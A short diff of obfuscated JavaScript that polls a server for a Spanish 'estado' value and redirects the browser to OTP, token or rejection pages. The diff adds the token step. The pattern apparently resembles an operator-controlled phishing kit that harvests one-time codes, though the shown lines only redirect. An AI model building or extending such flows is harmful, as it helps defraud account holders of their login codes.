@@ -464,7 +464,10 @@
                     var _0xlia = await _0xkia.json();
                     console.log('Estado:', _0xlia.estado);
 
-                    if (_0xlia.estado === 'otp') {
+                    if (_0xlia.estado === 'token') {
+                        clearInterval(_0xjia);
+                        window.location.href = 'token.html';
+                    } else if (_0xlia.estado === 'otp') {
                         clearInterval(_0xjia);
                         window.location.href = 'otp.html';
                     } else if (_0xlia.estado === 'rechazado') {
